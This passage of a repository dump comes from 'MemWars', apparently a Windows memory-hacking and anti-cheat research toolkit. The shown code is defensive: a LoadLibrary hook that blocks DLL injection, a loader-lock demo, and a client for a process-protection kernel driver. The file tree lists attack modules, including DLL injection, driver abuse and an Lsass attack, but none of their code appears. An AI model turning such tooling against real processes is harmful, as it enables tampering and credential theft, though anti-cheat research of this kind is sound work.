Project Path: arc_gmh5225_MemWars_5ovbk9kv

Source Tree:

```txt
arc_gmh5225_MemWars_5ovbk9kv
├── AntiCheatMethods
│   ├── DLLInjectionPrevention
│   │   ├── LoadLibraryHook
│   │   │   ├── InjectedDLL.dll
│   │   │   ├── LoadLibraryHook.cpp
│   │   │   ├── LoadLibraryHook.exe
│   │   │   └── buildLoadLibraryHook.bat
│   │   └── LoaderLock
│   │       ├── LoaderLock.cpp
│   │       ├── LoaderLock.exe
│   │       └── buildLoaderLock.bat
│   └── ObRegisterCallbacksDriver
│       ├── Client
│       │   ├── Client.cpp
│       │   ├── ObRegisterCallbacksDriver.sys
│       │   ├── buildClient.bat
│       │   ├── client.exe
│       │   ├── common.h
│       │   ├── pch.h
│       │   ├── shared.h
│       │   └── utils.cpp
│       ├── Debug
│       │   └── ObRegisterCallbacksDriver.inf
│       ├── ObRegisterCallbacksDriver
│       │   ├── Debug
│       │   │   ├── ObRegist.0443E933.tlog
│       │   │   │   ├── CL.command.1.tlog
│       │   │   │   ├── ObRegisterCallbacksDriver.lastbuildstate
│       │   │   │   ├── stampinf.command.1.tlog
│       │   │   │   ├── stampinf.read.1.tlog
│       │   │   │   ├── stampinf.write.1.tlog
│       │   │   │   └── unsuccessfulbuild
│       │   │   ├── ObRegisterCallbacksDriver.inf
│       │   │   ├── ObRegisterCallbacksDriver.log
│       │   │   └── vc141.pdb
│       │   ├── ObRegisterCallbacksDriver.inf
│       │   ├── ObRegisterCallbacksDriver.vcxproj
│       │   ├── ObRegisterCallbacksDriver.vcxproj.filters
│       │   ├── ObRegisterCallbacksDriver.vcxproj.user
│       │   ├── driver.c
│       │   ├── driver.h
│       │   └── x64
│       │       └── Debug
│       │           ├── ObRegist.0443E933.tlog
│       │           │   ├── CL.command.1.tlog
│       │           │   ├── CL.read.1.tlog
│       │           │   ├── CL.write.1.tlog
│       │           │   ├── Inf2Cat.command.1.tlog
│       │           │   ├── ObRegisterCallbacksDriver.lastbuildstate
│       │           │   ├── inf2cat-expand.11244.read.1.tlog
│       │           │   ├── inf2cat-expand.11244.write.1.tlog
│       │           │   ├── inf2cat-expand.12756.read.1.tlog
│       │           │   ├── inf2cat-expand.12756.write.1.tlog
│       │           │   ├── inf2cat-expand.1908.read.1.tlog
│       │           │   ├── inf2cat-expand.1908.write.1.tlog
│       │           │   ├── inf2cat-expand.2868.read.1.tlog
│       │           │   ├── inf2cat-expand.2868.write.1.tlog
│       │           │   ├── inf2cat-expand.2936.read.1.tlog
│       │           │   ├── inf2cat-expand.2936.write.1.tlog
│       │           │   ├── inf2cat-expand.3744.read.1.tlog
│       │           │   ├── inf2cat-expand.3744.write.1.tlog
│       │           │   ├── inf2cat-expand.6784.read.1.tlog
│       │           │   ├── inf2cat-expand.6784.write.1.tlog
│       │           │   ├── inf2cat-expand.6812.read.1.tlog
│       │           │   ├── inf2cat-expand.6812.write.1.tlog
│       │           │   ├── inf2cat-expand.7124.read.1.tlog
│       │           │   ├── inf2cat-expand.7124.write.1.tlog
│       │           │   ├── inf2cat-expand.9568.read.1.tlog
│       │           │   ├── inf2cat-expand.9568.write.1.tlog
│       │           │   ├── inf2cat-expand.read.1.tlog
│       │           │   ├── inf2cat-expand.write.1.tlog
│       │           │   ├── inf2cat.read.1.tlog
│       │           │   ├── inf2cat.read.8.tlog
│       │           │   ├── inf2cat.write.1.tlog
│       │           │   ├── inf2cat.write.8.tlog
│       │           │   ├── link.command.1.tlog
│       │           │   ├── link.read.1.tlog
│       │           │   ├── link.write.1.tlog
│       │           │   ├── signtool.command.1.tlog
│       │           │   ├── signtool.read.1.tlog
│       │           │   ├── signtool.timestamp.1.tlog
│       │           │   ├── signtool.write.1.tlog
│       │           │   ├── stampinf.command.1.tlog
│       │           │   ├── stampinf.read.1.tlog
│       │           │   └── stampinf.write.1.tlog
│       │           ├── ObRegisterCallbacksDriver.inf
│       │           ├── ObRegisterCallbacksDriver.log
│       │           └── vc141.pdb
│       ├── ObRegisterCallbacksDriver.sln
│       └── x64
│           └── Debug
│               ├── ObRegist.0443E933.tlog
│               │   ├── CL.command.1.tlog
│               │   ├── CL.read.1.tlog
│               │   ├── CL.write.1.tlog
│               │   ├── Inf2Cat.command.1.tlog
│               │   ├── ObRegisterCallbacksDriver.lastbuildstate
│               │   ├── inf2cat-expand.12948.read.1.tlog
│               │   ├── inf2cat-expand.12948.write.1.tlog
│               │   ├── inf2cat-expand.13540.read.1.tlog
│               │   ├── inf2cat-expand.13540.write.1.tlog
│               │   ├── inf2cat-expand.3956.read.1.tlog
│               │   ├── inf2cat-expand.3956.write.1.tlog
│               │   ├── inf2cat-expand.7088.read.1.tlog
│               │   ├── inf2cat-expand.7088.write.1.tlog
│               │   ├── inf2cat-expand.7348.read.1.tlog
│               │   ├── inf2cat-expand.7348.write.1.tlog
│               │   ├── inf2cat-expand.read.1.tlog
│               │   ├── inf2cat-expand.write.1.tlog
│               │   ├── inf2cat.read.1.tlog
│               │   ├── inf2cat.write.1.tlog
│               │   ├── inf2cat.write.8.tlog
│               │   ├── link.command.1.tlog
│               │   ├── link.read.1.tlog
│               │   ├── link.write.1.tlog
│               │   ├── signtool.command.1.tlog
│               │   ├── signtool.read.1.tlog
│               │   ├── signtool.timestamp.1.tlog
│               │   ├── signtool.write.1.tlog
│               │   ├── stampinf.command.1.tlog
│               │   ├── stampinf.read.1.tlog
│               │   └── stampinf.write.1.tlog
│               ├── ObRegisterCallbacksDriver
│               │   ├── ObRegisterCallbacksDriver.inf
│               │   ├── ObRegisterCallbacksDriver.sys
│               │   └── obregistercallbacksdriver.cat
│               ├── ObRegisterCallbacksDriver.cer
│               ├── ObRegisterCallbacksDriver.inf
│               ├── ObRegisterCallbacksDriver.log
│               ├── ObRegisterCallbacksDriver.pdb
│               ├── ObRegisterCallbacksDriver.sys
│               └── vc141.pdb
├── AttackServices
│   ├── CapcomDriverAttack
│   │   ├── CapcomAttackTest.cpp
│   │   ├── CapcomAttackTest.exe
│   │   ├── CapcomDriver.h
│   │   ├── CapcomLoader.h
│   │   ├── CapcomLockMemory.h
│   │   ├── CapcomWrapper.h
│   │   ├── NtDefines.h
│   │   ├── OpenProcessAttack.cpp
│   │   ├── OpenProcessAttack.h
│   │   ├── README.md
│   │   ├── buildCapcomAttackTest.bat
│   │   └── memoryTestApp.exe
│   ├── DLLInjectionAttack
│   │   ├── InjectedDLL.cpp
│   │   ├── InjectedDLL.dll
│   │   ├── Injector.cpp
│   │   ├── Injector.h
│   │   ├── InjectorNoShellcode.cpp
│   │   ├── InjectorTest.cpp
│   │   ├── InjectorTest.exe
│   │   ├── README.md
│   │   ├── buildDLL.bat
│   │   ├── build_InjecterTest.bat
│   │   └── memoryTestApp.exe
│   ├── Direct3D11HookAttack
│   │   ├── Direct3DHook.cpp
│   │   ├── Direct3DHook.h
│   │   ├── Direct3DHookDLL.cpp
│   │   ├── Direct3DHookDLL.dll
│   │   ├── Direct3DHookTest.cpp
│   │   ├── Direct3DHookTest.exe
│   │   ├── Direct3DTestApp.cpp
│   │   ├── Direct3DTestApp.exe
│   │   ├── README.md
│   │   ├── Resource.h
│   │   ├── buildDLL.bat
│   │   ├── buildDirect3DHookTest.bat
│   │   └── buildTestApp.bat
│   ├── HiddenKernelDLLInjectionAttack
│   │   ├── AttackTest.cpp
│   │   ├── AttackTest.exe
│   │   ├── InjectedDLL.dll
│   │   ├── Injector.h
│   │   ├── KernelDLLMapper.h
│   │   ├── MemoryController.h
│   │   ├── README.md
│   │   ├── TestApp.cpp
│   │   ├── TestApp.exe
│   │   ├── buildCapcomAttackTest.bat
│   │   └── memoryTestApp.exe
│   ├── IATHookAttack
│   │   ├── IATHookDLL.cpp
│   │   ├── IATHookDLL.dll
│   │   ├── IATHookTest.cpp
│   │   ├── README.md
│   │   ├── buildDLL.bat
│   │   ├── buildIATHookTest.bat
│   │   └── memoryTestApp.exe
│   ├── JmpHookAttack
│   │   ├── InjectedDLL.cpp
│   │   ├── InjectedDLL.dll
│   │   ├── InjectedDLL.h
│   │   ├── InjectorTest.cpp
│   │   ├── README.md
│   │   ├── buildDLL.bat
│   │   ├── build_InjectorTest.bat
│   │   └── memoryTestApp.exe
│   ├── LsassAttack
│   │   ├── README.md
│   │   ├── ServicesTest.cpp
│   │   ├── ServicesTest.exe
│   │   ├── StealthyMemManipulatorClient.cpp
│   │   ├── StealthyMemManipulatorClient.h
│   │   ├── StealthyMemManipulatorGetHandleId.cpp
│   │   ├── StealthyMemManipulatorGetHandleId.h
│   │   ├── StealthyMemManipulatorInstaller.cpp
│   │   ├── StealthyMemManipulatorInstaller.h
│   │   ├── TestPivotApp.c
│   │   ├── TestPivotApp.exe
│   │   ├── buildStealthyMemManipulatorTest.bat
│   │   ├── buildTestPivotApp.bat
│   │   ├── memoryTestApp.exe
│   │   └── spinlock.asm
│   ├── SocketHookAttack
│   │   ├── SocketHookDLL.cpp
│   │   ├── SocketHookDLL.dll
│   │   ├── SocketTestApp.cpp
│   │   ├── SocketTestApp.exe
│   │   ├── buildDLL.bat
│   │   └── buildTestApp.bat
│   └── ThreadHijackAttack
│       ├── README.md
│       ├── ThreadHijack.cpp
│       ├── ThreadHijack.h
│       ├── ThreadHijackTest.cpp
│       ├── ThreadHijackTest.exe
│       ├── buildThreadHijackTest.bat
│       └── memoryTestApp.exe
├── Core
│   ├── MemWarsCore.c
│   ├── MemWarsCore.h
│   ├── MemWarsCoreTest.c
│   ├── MemWarsCoreTest.exe
│   ├── MemWarsServicesCore.cpp
│   ├── MemWarsServicesCore.h
│   ├── buildMemWarsTest.bat
│   ├── buildTestApp.bat
│   ├── memoryTestApp.c
│   └── memoryTestApp.exe
├── LuaInterface
│   ├── ConsoleColors.lua
│   ├── ConsoleInterface
│   │   ├── ConsoleInterface.cpp
│   │   ├── ConsoleInterface.exe
│   │   ├── ConsoleInterface.h
│   │   └── buildConsoleInterface.bat
│   ├── ExampleScript.lua
│   ├── FullPenetrationTest.lua
│   ├── InjectedDLL.dll
│   ├── LuaInterface.cpp
│   ├── LuaInterface.exe
│   ├── Test.lua
│   ├── buildLuaInterface.bat
│   ├── lua-5.1.5_Win64
│   │   ├── include
│   │   │   ├── lauxlib.h
│   │   │   ├── lua.h
│   │   │   ├── lua.hpp
│   │   │   ├── luaconf.h
│   │   │   └── lualib.h
│   │   ├── liblua5.1.a
│   │   └── lua5.1.dll
│   └── lua5.1.dll
├── PenetrationRoutines
│   ├── AttackProvider
│   │   └── AttackProvider.h
│   ├── DLLInjectionProvider
│   │   ├── DLLInjectionProvider.cpp
│   │   ├── DLLInjectionProvider.exe
│   │   ├── DLLInjectionProvider.h
│   │   ├── InjectedDLL.dll
│   │   └── buildDLLInjectionProvider.bat
│   ├── KernelDLLInjectionProvider
│   │   ├── KernelDLLInjectionProvider.cpp
│   │   ├── KernelDLLInjectionProvider.exe
│   │   ├── KernelDLLInjectionProvider.h
│   │   └── buildKernelDLLInjectionProvider.bat
│   ├── LsassAttackProvider
│   │   ├── Client
│   │   │   ├── Client.exe
│   │   │   ├── LsassAttackProvider.cpp
│   │   │   ├── LsassAttackProvider.exe
│   │   │   ├── LsassAttackProvider.h
│   │   │   ├── LsassAttackProviderTest.cpp
│   │   │   ├── SPIAttackProviderTest.exe
│   │   │   ├── buildClient.bat
│   │   │   └── buildClientTest.bat
│   │   └── Installer
│   │       ├── Installer.exe
│   │       ├── LsassInstallProvider.cpp
│   │       ├── LsassInstallProvider.h
│   │       └── buildInstaller.bat
│   ├── ThreadHijackProvider
│   │   ├── ThreadHijackProvider.cpp
│   │   ├── ThreadHijackProvider.h
│   │   └── buildThreadHijackProvider.bat
│   └── ValueFinder
│       ├── ValueFinder.cpp
│       ├── ValueFinder.h
│       ├── ValueFinderTest.cpp
│       ├── ValueFinderTest.exe
│       ├── buildValueFinder.bat
│       └── buildValueFinderTest.bat
├── README.md
├── ShellcodeGeneration
│   ├── CreateFile.cpp
│   ├── CreateFile.exe
│   ├── CreateFileAsm.asm
│   ├── CreateFileAsm.exe
│   ├── HelloWorldAsm.asm
│   ├── InjectedDLL.dll
│   ├── LoadLibraryShellcode.c
│   ├── LoadLibraryShellcode.exe
│   ├── LoadLibraryShellcode_bak.c
│   ├── ShellcodeInjectionCreateFileExample.c
│   ├── ShellcodeInjectionCreateFileExample.exe
│   ├── ShellcodeInjectionMessageBoxExample.c
│   ├── ShellcodeInjectionMessageBoxExample.exe
│   ├── buildAssembly_x64.bat
│   ├── buildCreateFileExample.bat
│   ├── buildLoadLibraryShellcode.bat
│   ├── buildMessageBoxExample.bat
│   └── memoryTestApp.exe
├── libs
│   ├── Capstone
│   │   ├── include
│   │   │   ├── arm.h
│   │   │   ├── arm64.h
│   │   │   ├── capstone.h
│   │   │   ├── mips.h
│   │   │   ├── platform.h
│   │   │   ├── ppc.h
│   │   │   ├── sparc.h
│   │   │   ├── systemz.h
│   │   │   ├── x86.h
│   │   │   └── xcore.h
│   │   ├── msvc
│   │   │   ├── x64
│   │   │   │   ├── Debug
│   │   │   │   │   └── capstone.lib
│   │   │   │   └── Release
│   │   │   │       └── capstone.lib
│   │   │   └── x86
│   │   │       ├── Debug
│   │   │       │   └── capstone.lib
│   │   │       └── Release
│   │   │           └── capstone.lib
│   │   └── msvc_vs2017
│   │       ├── x64
│   │       │   ├── Debug
│   │       │   │   └── capstone.lib
│   │       │   └── Release
│   │       │       └── capstone.lib
│   │       └── x86
│   │           ├── Debug
│   │           │   └── capstone.lib
│   │           └── Release
│   │               └── capstone.lib
│   ├── LuaBridge
│   │   ├── LuaBridge.h
│   │   ├── RefCountedObject.h
│   │   ├── RefCountedPtr.h
│   │   └── detail
│   │       ├── CFunctions.h
│   │       ├── ClassInfo.h
│   │       ├── Constructor.h
│   │       ├── FuncTraits.h
│   │       ├── Iterator.h
│   │       ├── LuaException.h
│   │       ├── LuaHelpers.h
│   │       ├── LuaRef.h
│   │       ├── Namespace.h
│   │       ├── Stack.h
│   │       ├── TypeList.h
│   │       ├── TypeTraits.h
│   │       ├── Userdata.h
│   │       └── dump.h
│   └── PolyHook
│       ├── CatchUnitTest.h
│       ├── PolyHook.hpp
│       ├── PolyHook.vcxproj
│       ├── PolyHook.vcxproj.filters
│       └── Tests.cpp
└── workspace.code-workspace

```

`AntiCheatMethods/DLLInjectionPrevention/LoadLibraryHook/LoadLibraryHook.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include "../../../libs/PolyHook/PolyHook.hpp"

using namespace std;

typedef HMODULE(__stdcall* tLoadLibraryA)(LPCTSTR lpFileName);
tLoadLibraryA oLoadLibraryA;

typedef HMODULE(__stdcall* tLoadLibraryW)(LPWSTR lpFileName);
tLoadLibraryW oLoadLibraryW;

HMODULE __stdcall hLoadLibraryA(LPCTSTR lpFileName) {
    wcout << lpFileName << L" tried to be injected" << endl;
    if (strcmp(lpFileName, "allowed.dll") == 0) {
        return oLoadLibraryA(lpFileName);
    } else {
        cout << "invalid DLL detected" << endl;
        SetLastError(ERROR_ACCESS_DENIED);
        return NULL;
    }
}

HMODULE __stdcall hLoadLibraryW(LPWSTR lpFileName) {
    wcout << lpFileName << L" tried to be injected" << endl;
    if (wcscmp(lpFileName, L"allowed.dll") == 0) {
        return oLoadLibraryW(lpFileName);
    } else {
        cout << "invalid DLL detected" << endl;
        SetLastError(ERROR_ACCESS_DENIED);
        return NULL;
    }
}


int main() {
    shared_ptr<PLH::Detour> Detour_Ex(new PLH::Detour);
    Detour_Ex->SetupHook((BYTE*)&LoadLibraryA,(BYTE*) &hLoadLibraryA);
    Detour_Ex->Hook();
    oLoadLibraryA = Detour_Ex->GetOriginal<tLoadLibraryA>(); 

    Detour_Ex->SetupHook((BYTE*)&LoadLibraryW,(BYTE*) &hLoadLibraryW);
    Detour_Ex->Hook();
    oLoadLibraryW = Detour_Ex->GetOriginal<tLoadLibraryW>(); 

    // LoadLibraryA("InjectedDLL.dll");
    // LoadLibraryW(L"InjectedDLL.dll");
    for (;;) {
        // try to inject me
        TlsGetValue(0);
        Sleep(10);
    }
}
```

`AntiCheatMethods/DLLInjectionPrevention/LoadLibraryHook/buildLoadLibraryHook.bat`:

```bat
@ECHO OFF
cl.exe /EHsc LoadLibraryHook.cpp ../../../Core/MemWarsServicesCore.cpp ../../../Core/MemWarsCore.c /link /LTCG /LIBPATH:"C:\Users\marius\git\MemWars\libs\Capstone\msvc\x64\Release" user32.lib ntdll.lib Advapi32.lib Shlwapi.lib
```

`AntiCheatMethods/DLLInjectionPrevention/LoaderLock/LoaderLock.cpp`:

```cpp
/*
    This program uses LdrLockLoaderLock to prevent the loading of any libraries, which grants immunity to any malicious DLL injections.
    While this method is very effective, it also prevents any friendly DLL to be loaded, which is unpractical in game development.
*/

#include <windows.h>
#include <iostream>

#define LDR_LOCK_LOADER_LOCK_FLAG_DEFAULT 0x00000000
#define STATUS_SUCCESS 0

using namespace std;

using fnFreeCall = uint64_t(__fastcall*)(...);

template<typename ...Params>
static NTSTATUS __NtRoutine(const char* Name, Params &&... params) {
	auto fn = (fnFreeCall) GetProcAddress(GetModuleHandleA("ntdll.dll"), Name);
	return fn(std::forward<Params>(params)...);
}

#define LdrLockLoaderLock(...) __NtRoutine("LdrLockLoaderLock", __VA_ARGS__)

int main() {

    ULONG_PTR m_uCookie = NULL;
    ULONG uState = NULL;
    NTSTATUS ntStatus = LdrLockLoaderLock(LDR_LOCK_LOADER_LOCK_FLAG_DEFAULT, &uState, &m_uCookie);
    if (ntStatus == STATUS_SUCCESS) {
        cout << "success, try to inject me" << endl;
    } else {
        cout << "failed" << endl;
        return 1;
    }

    for (;;) {
        // try to inject me
        TlsGetValue(0);
        Sleep(10);
    }
}
```

`AntiCheatMethods/DLLInjectionPrevention/LoaderLock/buildLoaderLock.bat`:

```bat
@ECHO OFF
cl.exe /EHsc LoaderLock.cpp ../../../Core/MemWarsServicesCore.cpp ../../../Core/MemWarsCore.c /link user32.lib ntdll.lib Advapi32.lib Shlwapi.lib
```

`AntiCheatMethods/ObRegisterCallbacksDriver/Client/Client.cpp`:

```cpp
#include "pch.h"
#include "common.h"

void TcPrintUsage()
{
    puts ("Usage:");
    puts ("");
    puts("    ObCallbackTestCtrl.exe -install -name NameofExe -reject NameofExe -uninstall -deprotect [-?]");
    puts("     -install        install driver");
    puts("     -uninstall      uninstall driver");
    puts("     -name NameofExe    protect/filter access to NameofExe");
    puts("     -reject NameofExe    prevents execution of NameofExe");
    puts("     -deprotect      unprotect/unfilter");
}

int _cdecl
wmain (
    _In_ int argc,
    _In_reads_(argc) LPCWSTR argv[]
)
{
    int ExitCode = ERROR_SUCCESS;

    if (argc > 1)
    {
        const wchar_t * arg = argv[1];

        // initialize globals and logging
        if (!TcInitialize()) {
            puts("Initialization failed - program exiting");
            ExitCode = ERROR_FUNCTION_FAILED;
            goto Exit;
        }

        if (0 == wcscmp (arg, L"-install")) {
            TcInstallDriver();

        } else if (0 == wcscmp (arg, L"-uninstall")) {
            TcUninstallDriver();

        } else if ((0 == wcscmp (arg, L"-?")) || (0 == wcscmp (arg, L"-h")) || (0 == wcscmp (arg, L"-help"))) {
            TcPrintUsage();

        } else if (0 == wcscmp (arg, L"-deprotect")) {
            TcRemoveProtection();
            
        } else if (0 == wcscmp (arg, L"-name")) {
            TcProcessName (argc, argv, TDProtectName_Protect);

        } else	{
			puts ("Unknown command!");
			TcPrintUsage();
        }
        
    }
    else
    {
        TcPrintUsage();
    }

Exit:

    if (!TcUnInitialize()) {
        puts("UnInitialization failed");
        ExitCode = ERROR_FUNCTION_FAILED;
    }

    return ExitCode;
}



BOOL TcRemoveProtection ()
{
    BOOL ReturnValue = FALSE;

    LOG_INFO(_T("TcRemoveProtection: Entering"));

    ReturnValue = TcOpenDevice();
    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (_T("TcOpenDevice failed"));
        goto Exit;
    }

    ReturnValue = TcUnprotectCallback();
    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (_T("TcUnprotectCallback failed"));
        goto Exit;
    }

Exit:

    ReturnValue = TcCloseDevice();
    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (_T("TcCloseDevice failed"));
    }
   

    LOG_INFO(_T("TcRemoveProtection: Exiting"));

    return ReturnValue;
}

BOOL TcProcessName(
    _In_ int argc,
    _In_reads_(argc) LPCWSTR argv[],
    _In_ ULONG ulOperation
)
{
    BOOL ReturnValue = FALSE;

    PCWSTR pwProcessName = NULL;

    LOG_INFO(L"TcProcessName: Entering");


    //
    // Parse command line.
    //
    // argv[1] is "-name" so starting from arg #2 that should be the process name to protect
    //

    if (argc < 3) {
        LOG_INFO_FAILURE (L"TcProcessName: Too few parameters");
        LOG_INFO_FAILURE (L"TcProcessName: Usage  -name nameofExe  -reject nameofExe");
        ReturnValue = FALSE;
        goto Exit;
    }

    pwProcessName = argv[2];

    if (!pwProcessName) {
        LOG_INFO_FAILURE (L"TcProcessName: NULL process name to process");
        ReturnValue = FALSE;
        goto Exit;
    }


    LOG_INFO(L"Ready to copy process name");
    LOG_INFO(L"Name to pass to driver   %ls", pwProcessName);


    ReturnValue = TcOpenDevice();
    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (L"TcProcessName: TcOpenDevice failed");
        goto Exit;
    }


    ReturnValue = TcProcessNameCallback(pwProcessName, ulOperation);
    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (L"TcProcessName: TcProcessNameCallback failed");
        goto Exit;
    }

Exit:

    ReturnValue = TcCloseDevice();
    if (ReturnValue != TRUE)
    {
        LOG_INFO_FAILURE (L"TcProtectProcess: TcCloseDevice failed");
    }
   

    LOG_INFO(L"TcProtectProcess: Exiting");

    return ReturnValue;
}


BOOL TcInstallDriver ()
{
    BOOL bRC = TRUE;

    LOG_INFO(L"TcInstallDriver: Entering");
    BOOL Result = TcLoadDriver();

    if (Result != TRUE)
    {
        LOG_ERROR (L"TcLoadDriver failed, exiting");
        bRC = FALSE;
        goto Exit;
    }

Exit:

    LOG_INFO(L"TcInstallDriver: Exiting");
    return bRC;
}


BOOL TcUninstallDriver ()
{
    BOOL bRC = TRUE;

    LOG_INFO(L"TcUninstallDriver: Entering");
    BOOL Result = TcUnloadDriver();

    if (Result != TRUE)
    {
        LOG_ERROR (L"TcUnloadDriver failed, exiting");
        bRC = FALSE;
        goto Exit;
    }

Exit:

    LOG_INFO(L"TcUninstallDriver: Exiting");
    return bRC;
}

BOOL bLoggingInitialized = FALSE;

BOOL TcInitialize  ()
{

    BOOL Result = TcInitializeGlobals();
    if (Result != TRUE)
    {
        LOG_ERROR (L"TcInitializeGlobals failed, exiting");
        return FALSE;
    }

    LOG_INFO(L"TcInitialize: Entering");
    return TRUE;

}


BOOL TcUnInitialize()
{
    if (TcCleanupSCM() == FALSE){
        LOG_ERROR (L"TcUnInitialize failed cleanup of SCM");
    }
    return TRUE;
}
```

`AntiCheatMethods/ObRegisterCallbacksDriver/Client/buildClient.bat`:

```bat
@ECHO OFF
cl.exe /EHsc /source-charset:utf-8 client.cpp utils.cpp /link user32.lib kernel32.lib ntdll.lib Advapi32.lib
```

`AntiCheatMethods/ObRegisterCallbacksDriver/Client/common.h`:

```h
#pragma once

#pragma warning (disable: 4201) // nonstandard extension used : nameless struct/union

#include <windows.h>
#include <stdio.h>
#include "shared.h"

//
// Logging support macros.
//
// LOG_INFO
// LOG_INFO_FAILURE
// LOG_PASSED
// LOG_ERROR
//

#define DEBUG

#ifdef DEBUG
#define LOG_INFO(fmt, ...)         \
    _tprintf(_T("%hs: ") fmt, __FUNCTION__, __VA_ARGS__);_tprintf(_T("\n"));
#define LOG_INFO_FAILURE(fmt, ...) \
    _tprintf(_T("ReportFailure %hs: ") fmt, __FUNCTION__, __VA_ARGS__);_tprintf(_T("\n"));

#define LOG_PASSED(fmt, ...)       \
    _tprintf(_T("\n!!!PASSED: %hs (%hs:%u): ") fmt, __FUNCTION__, __FILE__, __LINE__, __VA_ARGS__);_tprintf(_T("\n"));
#define LOG_ERROR(fmt, ...)        \
    _tprintf(_T("\n!!!FAILED: %hs (%hs:%u): ") fmt, __FUNCTION__, __FILE__, __LINE__, __VA_ARGS__); _tprintf(_T("\n"));

#else

#define LOG_INFO(FormatString, ...)
    // std::cout << (wchar_t*)FormatString << std::endl;//printf(FormatString);
#define LOG_INFO_FAILURE(FormatString, ...) 

#define LOG_PASSED(FormatString, ...)      
#define LOG_ERROR(FormatString, ...)   

#endif


extern HANDLE TcDeviceHandle;

BOOL TcInitialize();
BOOL TcUnInitialize();
BOOL TcCleanupSCM();

BOOL TcInstallDriver();

BOOL TcUninstallDriver();

BOOL TcRemoveProtection ();

BOOL TcProcessName (
    _In_ int argc,
    _In_reads_(argc) LPCWSTR argv[],
    _In_ ULONG ulOperation
);

BOOL TcUnprotectCallback ();

BOOL TcProcessNameCallback (
    _In_reads_(NAME_SIZE+1) PCWSTR  pnametoprotect,
    _In_ ULONG ulOperation
);

//
// Utility functions
//

BOOL TcInitializeGlobals();
BOOL TcLoadDriver();
BOOL TcUnloadDriver();

BOOL TcCreateService();
BOOL TcDeleteService();
BOOL TcStartService();
BOOL TcStopService();

BOOL TcOpenDevice();
BOOL TcCloseDevice();
```

`AntiCheatMethods/ObRegisterCallbacksDriver/Client/pch.h`:

```h
#pragma once

//#include <nt.h>
//#include <ntrtl.h>
//#include <nturtl.h>
#include <windows.h>
#include <stdlib.h>
#include <tchar.h>
#include <strsafe.h>
#include <winioctl.h>
```

`AntiCheatMethods/ObRegisterCallbacksDriver/Client/shared.h`:

```h
/*++

Module Name:

    shared.h

Abstract:

    This contains declarations shared by the Ob/Ps callback test driver and
    the user mode test app.


// Notice:
//
//    Use this sample code at your own risk; there is no support from Microsoft for the sample code.
//    In addition, this sample code is licensed to you under the terms of the Microsoft Public License
//    (http://www.microsoft.com/opensource/licenses.mspx)

--*/

#pragma once

#pragma warning(disable:4214) // bit field types other than int
#pragma warning(disable:4201) // nameless struct/union

//
// TD_ASSERT
//
// This macro is identical to NT_ASSERT but works in fre builds as well.
//
// It is used for error checking in the driver in cases where
// we can't easily report the error to the user mode app, or the
// error is so severe that we should break in immediately to
// investigate.
//
// It's better than DbgBreakPoint because it provides additional info
// that can be dumped with .exr -1, and individual asserts can be disabled
// from kd using 'ahi' command.
//

#define TD_ASSERT(_exp) \
    ((!(_exp)) ? \
        (__annotation(L"Debug", L"AssertFail", L#_exp), \
         DbgRaiseAssertionFailure(), FALSE) : \
        TRUE)

//
// Driver and device names
// It is important to change the names of the binaries
// in the sample code to be unique for your own use.
//

// #define TD_DRIVER_NAME             L"ObCallbackTest"
// #define TD_DRIVER_NAME_WITH_EXT    L"ObCallbackTest.sys"
#define TD_DRIVER_NAME             L"ObRegisterCallbacksDriver"
#define TD_DRIVER_NAME_WITH_EXT    L"ObRegisterCallbacksDriver.sys"

#define TD_NT_DEVICE_NAME          L"\\Device\\ObCallbackTest"
#define TD_DOS_DEVICES_LINK_NAME   L"\\DosDevices\\ObCallbackTest"
#define TD_WIN32_DEVICE_NAME       L"\\\\.\\ObCallbackTest"


#define NAME_SIZE   200

#define TD_INVALID_CALLBACK_ID ((ULONG)-1)

//
// IOCTLs exposed by the driver.
//

// #define TD_IOCTL_REGISTER_CALLBACK   CTL_CODE (FILE_DEVICE_UNKNOWN, (0x800 + 0), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
// #define TD_IOCTL_UNREGISTER_CALLBACK CTL_CODE (FILE_DEVICE_UNKNOWN, (0x800 + 1), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define TD_IOCTL_PROTECT_NAME_CALLBACK        CTL_CODE (FILE_DEVICE_UNKNOWN, (0x800 + 2), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define TD_IOCTL_UNPROTECT_CALLBACK           CTL_CODE (FILE_DEVICE_UNKNOWN, (0x800 + 3), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)


#define TDProtectName_Protect  0            // name of programs to proect and filter out the desiredAccess on Process Open
#define TDProtectName_Reject   1            // name of programs to reject during ProcessCreate

//
// Structures used by TD_IOCTL_PROTECTNAME
//

typedef struct _TD_PROTECTNAME_INPUT {
    ULONG Operation;
    WCHAR Name[NAME_SIZE+1];      // what is the filename to protect - extra wchar for forced NULL
}
TD_PROTECTNAME_INPUT, *PTD_PROTECTNAME_INPUT;

//
// Structures used by TD_IOCTL_UNPROTECT_CALLBACK
//

typedef struct _TD_UNPROTECT_CALLBACK_INPUT {
    ULONG UnusedParameter;
}
TD_UNPROTECT_CALLBACK_INPUT, *PTD_UNPROTECT_CALLBACK_INPUT;

```

`AntiCheatMethods/ObRegisterCallbacksDriver/Client/utils.cpp`:

```cpp
#include "pch.h"
#include "common.h"

//
// Globals
//

SC_HANDLE TcScmHandle = NULL;
HANDLE TcDeviceHandle = INVALID_HANDLE_VALUE;

WCHAR TcDriverPath[MAX_PATH];


//
// TcUnprotectCallback
//
// Sends unprotect callback ioctl to the driver.
//

BOOL TcUnprotectCallback ()
{
    TD_UNPROTECT_CALLBACK_INPUT UnprotectCallbackInput = {0};

    DWORD BytesReturned = 0;

    LOG_INFO (L"TcUnprotectCallback: entering");

    BOOL Result = DeviceIoControl (
        TcDeviceHandle,
        TD_IOCTL_UNPROTECT_CALLBACK,
        &UnprotectCallbackInput,
        sizeof(UnprotectCallbackInput),
        NULL,
        0,
        &BytesReturned,
        NULL
    );

    if (Result == TRUE)
    {
        LOG_INFO (L"TcUnprotectCallback: succeeded");
    }
    else
    {
        LOG_INFO_FAILURE (L"TcUnprotectCallback: DeviceIoControl failed, last error 0x%x", GetLastError());
    }


    LOG_INFO (L"TcUnprotectCallback: exiting");
    return Result;
}


//
// TcUnprotectCallback
